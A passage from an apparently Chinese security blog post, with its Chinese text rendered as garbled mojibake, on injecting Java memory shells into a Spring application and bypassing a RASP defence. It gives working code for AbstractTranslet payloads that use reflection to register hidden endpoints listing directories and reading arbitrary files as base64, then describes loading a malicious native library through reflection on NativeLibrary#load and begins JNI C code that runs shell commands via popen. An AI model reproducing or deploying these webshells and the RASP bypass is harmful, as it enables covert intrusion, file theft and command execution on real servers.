class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;File: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;Directory: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                        listFilesAndDirectories(file,response); <span class="comment">// é€’å½’éå†å­ç›®å½•</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„ç¼ºç‚¹æ˜¯åˆ—å‡ºæ ¹ç›®å½•çš„æ—¶å€™å¤ªå¤šæ‚ç¢çš„ä¸œè¥¿,ğŸ‘´çœ‹ä¸åŠ¨,è¦ä¸æ˜¯ğŸ‘´çŸ¥é“&#x2F;homeä¸‹é¢æœ‰ä¸œè¥¿,è¿™ç©æ„å¤ªéš¾æ‰¾äº†.</p>
<p>ä¼˜åŒ–ä¸€ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls1&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls1&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file!=<span class="literal">null</span>) &#123;</span><br><span class="line">                        response.getWriter().write(file.getAbsolutePath()+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231106112020.png" alt="å¾®ä¿¡æˆªå›¾_20231106112020"></p>
<p>è¿™æ ·çœ‹èµ·æ¥èˆ’æœå¤šäº†,ğŸ‘´å¾ˆä¸­æ„ğŸ˜Š</p>
<h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><p>ğŸ‘´æƒ³å°è¯•æŸç’æ¯çš„ä»£ç ,ç›´æ¥é€šè¿‡<code>ResponseEntity</code>ä¸‹è½½æ–‡ä»¶,å¾ˆå¯æƒœ,å¤±è´¥äº†,ä½†æ˜¯æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„è¯»å–,æ€ä¹ˆåŠ,ğŸ‘´ç”¨base64è¯»å‡ºæ¥,ğŸ‘´çœŸtmæ˜¯å®Œç¾å¤©æ‰çš„idol(bushi)</p>
<p>ç»ˆäºğŸ‘´æƒ³æ˜ç™½äº†ä¸€ä»¶äº‹,å†™å‡ºäº†å†…å­˜ğŸ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exre</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exre.class.getMethod(<span class="string">&quot;readfile2&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/readfile2&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exre</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exre</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readfile2</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filepath&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(filePath!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">byte</span>[] fileBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(fileBytes);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">                response.getWriter().write(base64String);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ä»€ä¹ˆ,ä½ è¯´ä½ ä¸ä¼šbase64è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶?ğŸ¤£</p>
<p>è‡ªå·±å†™ä¸ªè„šæœ¬è½¬æ¢éƒ½è¡Œ,ğŸ‘´å‘Šè¯‰ä½ ,è¿˜èƒ½ä¸Šcyberchefè½¬æ¢,è¿˜èƒ½å¯¼å‡ºä¸ºæ–‡ä»¶ğŸ˜…</p>
<h2 id="RASPğŸ˜…ğŸ˜¡"><a href="#RASPğŸ˜…ğŸ˜¡" class="headerlink" title="RASPğŸ˜…ğŸ˜¡"></a>RASPğŸ˜…ğŸ˜¡</h2><p>ç»•è¿‡content-lengthå°±ç®€å•äº†?8å¯èƒ½!</p>
<p>nmbç”šè‡³æœ‰RASP,âˆšâ…§,ğŸ‘´æ²¡å­¦è¿‡.</p>
<h3 id="å•¥äº‹RASP"><a href="#å•¥äº‹RASP" class="headerlink" title="å•¥äº‹RASP"></a>å•¥äº‹RASP</h3><p>åœ¨2012å¹´çš„æ—¶å€™ï¼ŒGartnerå¼•å…¥äº†<code>Runtime application self-protection</code>ä¸€è¯ï¼Œç®€ç§°ä¸ºRASPã€‚å®ƒæ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ ·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºèä¸ºä¸€ä½“ï¼Œèƒ½å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ï¼Œå½“åº”ç”¨ç¨‹åºé­å—åˆ°å®é™…æ”»å‡»ä¼¤å®³ï¼Œå°±å¯ä»¥è‡ªåŠ¨å¯¹å…¶è¿›è¡Œé˜²å¾¡ï¼Œè€Œä¸éœ€è¦è¿›è¡Œäººå·¥å¹²é¢„ã€‚</p>
<p>RASPæŠ€æœ¯å¯ä»¥å¿«é€Ÿçš„å°†å®‰å…¨é˜²å¾¡åŠŸèƒ½æ•´åˆåˆ°æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ‹¦æˆªä»åº”ç”¨ç¨‹åºåˆ°ç³»ç»Ÿçš„æ‰€æœ‰è°ƒç”¨ï¼Œç¡®ä¿å®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå¹¶ç›´æ¥åœ¨åº”ç”¨ç¨‹åºå†…éªŒè¯æ•°æ®è¯·æ±‚ã€‚Webå’ŒéWebåº”ç”¨ç¨‹åºéƒ½å¯ä»¥é€šè¿‡RASPè¿›è¡Œä¿æŠ¤ã€‚è¯¥æŠ€æœ¯ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„è®¾è®¡ï¼Œå› ä¸ºRASPçš„æ£€æµ‹å’Œä¿æŠ¤åŠŸèƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿä¸Šè¿è¡Œçš„ã€‚</p>
<p>ğŸ‘´è¯´äººè¯:å°±æ˜¯nmæŠŠå†…å­˜è¿‡æ»¤,å®æ—¶åŠ¨æ€é˜²æŠ¤.åˆ«äººå«å†…å­˜é©¬,ä½ å«å†…å­˜ç›¾.</p>
<p>è‡³äºè¿™ç©æ„,ğŸ‘´å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†,å…ˆç­‰ğŸ‘´æ–°å¼€ä¸ªæ–‡ç« ,è®°å½•ä¸€ä¸‹RASPçš„å­¦ä¹ ç¬”è®°.</p>
<p>ğŸ‘´å›æ¥äº†,åˆ°äº†æœ€åçš„æ­¥éª¤äº†.,çœ‹ğŸ‘´ç»•è¿‡è¿™è¯¥æ­»çš„RASP.</p>
<p>é€šè¿‡java-agentæ’æ¡©æŠ€æœ¯,hookä½äº†ä¸€äº›åº•å±‚çš„ç±»,ä½¿å¾—javaçš„execä¸èƒ½å¤Ÿæ‰§è¡Œ</p>
<p>ä¸€èˆ¬æ˜¯unixæˆ–è¿™forkandexec</p>
<p><code>forkAndExec</code> é€šå¸¸æ˜¯ä¸æ“ä½œç³»ç»Ÿè¿›ç¨‹ç®¡ç†ç›¸å…³çš„æ“ä½œï¼Œç”¨äºåœ¨ç±»Unixæ“ä½œç³»ç»Ÿä¸­ï¼ˆå¦‚Linuxï¼‰åˆ›å»ºå­è¿›ç¨‹å¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p>
<p>å¯æ¶çš„RASP hookä½äº†è¿™äº›ç±»</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231106112422.png" alt="å¾®ä¿¡æˆªå›¾_20231106112422"></p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231106112531.png" alt="å¾®ä¿¡æˆªå›¾_20231106112531"></p>
<p>ç”šè‡³è¿˜ä¸è®©æœ¬åœ°JNIåŠ è½½äº†,<code>loadLibrary0</code>ä¹Ÿè¢«hookäº†</p>
<h2 id="è§£å†³æ–¹æ¡ˆğŸ˜’"><a href="#è§£å†³æ–¹æ¡ˆğŸ˜’" class="headerlink" title="è§£å†³æ–¹æ¡ˆğŸ˜’"></a>è§£å†³æ–¹æ¡ˆğŸ˜’</h2><p>åº•å±‚çš„nativeæ–¹æ³• <code>java.lang.ClassLoader.NativeLibrary#load</code> å¹¶æœªè¢«hookï¼Œå¹¶ä¸”åå°„ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨åå°„æ¥è°ƒç”¨ <code>java.lang.ClassLoader.NativeLibrary</code> ä¸­çš„ <code>load</code> æ–¹æ³•æ¥åŠ è½½æ¶æ„soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤</p>
<p>èˆ¹æ–°å§¿åŠ¿ä¹‹<code>javah</code></p>
<p>å¯ä»¥,æˆ‘å°±å–œæ¬¢hğŸ˜Š</p>
<p><code>javah</code> æ˜¯ Java å¼€å‘å·¥å…·åŒ… (JDK) æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç”Ÿæˆ Java ç±»çš„æœ¬åœ°æ–¹æ³•æ¥å£ (Native Method Interface, JNI) å¤´æ–‡ä»¶ã€‚JNI å…è®¸ Java ä»£ç ä¸æœ¬åœ°ï¼ˆé€šå¸¸æ˜¯Cæˆ–C++ï¼‰ä»£ç è¿›è¡Œäº¤äº’ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸ç¡¬ä»¶äº¤äº’æˆ–ä¸ç°æœ‰çš„æœ¬åœ°åº“è¿›è¡Œé›†æˆã€‚</p>
<p>ç¼–å†™åŒ…å«æœ¬åœ°æ–¹æ³•å£°æ˜çš„ Java ç±»ï¼Œä½¿ç”¨ <code>native</code> å…³é”®å­—å£°æ˜æœ¬åœ°æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨javacç¼–è¯‘æˆclass,ç„¶åä½¿ç”¨javahç¼–è¯‘æˆhæ–‡ä»¶</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javah -jni EvilClass</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„EvilClass.hå¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class EvilClass */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_EvilClass</span><br><span class="line">#define _Included_EvilClass</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     EvilClass</span></span><br><span class="line"><span class="comment"> * Method:    execCmd</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è¿˜è¦æ ¹æ®è¿™ä¸ªhæ–‡ä»¶å†™Cæ–‡ä»¶,nmğŸ‘´ä¸ä¼šc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//å®šä¹‰ç¼“å†²åŒº</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">&quot;r&quot;</span>); <span class="comment">//æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe))</span><br><span 